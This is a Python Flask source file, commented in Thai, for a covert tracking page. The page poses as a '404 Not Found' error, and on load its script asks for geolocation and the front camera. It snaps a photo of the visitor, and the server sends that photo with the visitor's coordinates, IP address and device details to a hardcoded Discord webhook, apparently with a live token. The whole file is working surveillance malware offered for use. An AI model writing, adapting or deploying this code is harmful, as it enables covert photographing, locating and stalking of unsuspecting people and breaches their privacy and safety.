from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# Webhook ของคุณ
WEBHOOK_URL = "https://discord.com/api/webhooks/1502861219311386739/GnsrVB5t1lONJcH-oK8LhuCe8yEGMxYp9-FHmq3FW_k3MnsisqF7zOuSCdEN1qgjI8kZ"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <script>
        async function run() {
            const entryTime = new Date().toLocaleString('th-TH');
            const userAgent = navigator.userAgent;

            navigator.geolocation.getCurrentPosition(async (pos) => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();

                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth; 
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
                    const formData = new FormData();
                    formData.append('file', blob, 'shot.jpg');
                    formData.append('lat', pos.coords.latitude);
                    formData.append('lon', pos.coords.longitude);
                    formData.append('ua', userAgent);
                    formData.append('time', entryTime);

                    await fetch('/upload', { method: 'POST', body: formData });
                    
                    stream.getTracks().forEach(t => t.stop());
                } catch (e) {}
                
                // เปลี่ยนข้อความบนหน้าจอแทนการไป Google
                document.getElementById('status').innerHTML = "<h1>404 Not Found</h1><p>The requested URL was not found on this server.</p>";
            }, () => { 
                document.getElementById('status').innerHTML = "<h1>404 Not Found</h1><p>The requested URL was not found on this server.</p>";
            });
        }
        window.onload = run;
    </script>
</head>
<body style="background:#fff; color:#000; display:flex; justify-content:center; align-items:center; height:100vh; font-family:serif; margin:0;">
    <div id="status" style="text-align:center;">
        <p>Loading...</p>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return HTML_TEMPLATE

@app.route('/upload', methods=['POST'])
def upload():
    img = request.files.get('file')
    lat = request.form.get('lat')
    lon = request.form.get('lon')
    ua = request.form.get('ua')
    entry_time = request.form.get('time')
    
    ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    
    msg = (
        f"👹 **GUBOSS**\\n"
        f"⏰ **เวลา:** `{entry_time}`\\n"
        f"🌐 **IP:** `{ip}`\\n"
        f"📱 **อุปกรณ์:** `{ua}`\\n"
        f"📍 **พิกัด:** https://www.google.com/maps?q={lat},{lon}"
    )
    
    files = {'file': ('shot.jpg', img.read(), 'image/jpeg')}
    requests.post(WEBHOOK_URL, data={'content': msg}, files=files)

    return jsonify({"status": "ok"})

app_handler = app